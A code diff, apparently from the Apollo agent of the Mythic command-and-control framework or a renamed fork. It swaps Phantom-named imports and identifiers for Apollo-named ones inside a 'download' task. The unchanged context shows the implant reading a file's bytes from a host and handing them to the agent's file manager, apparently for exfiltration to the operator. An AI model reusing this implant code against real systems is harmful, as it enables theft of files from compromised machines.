@@ -8,9 +8,9 @@
 
 using System;
 using System.Linq;
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.IO;
 
@@ -44,7 +44,7 @@ namespace Tasks
             MythicTaskResponse resp;
             try
             {
-                DownloadParameters parameters = _dataSerializer.Deserialize<DownloadParameters>(_data.Parameters);
+                DownloadParameters parameters = _jsonSerializer.Deserialize<DownloadParameters>(_data.Parameters);
                 string host = parameters.Hostname;
                 if (string.IsNullOrEmpty(parameters.Hostname) && !File.Exists(parameters.FileName))
                 {
@@ -92,7 +92,7 @@ namespace Tasks
                     byte[] fileBytes = new byte[0];
                     fileBytes = File.ReadAllBytes(path);
 
-                    ICommandMessage[] artifacts = new ICommandMessage[1]
+                    IMythicMessage[] artifacts = new IMythicMessage[1]
                     {
                         new Artifact
                         {
@@ -101,7 +101,7 @@ namespace Tasks
                         }
                     };
                     if (_agent.GetFileManager().PutFile(
-                            _stopToken.Token,
+                            _cancellationToken.Token,
                             _data.ID,
                             fileBytes,
                             parameters.FileName,
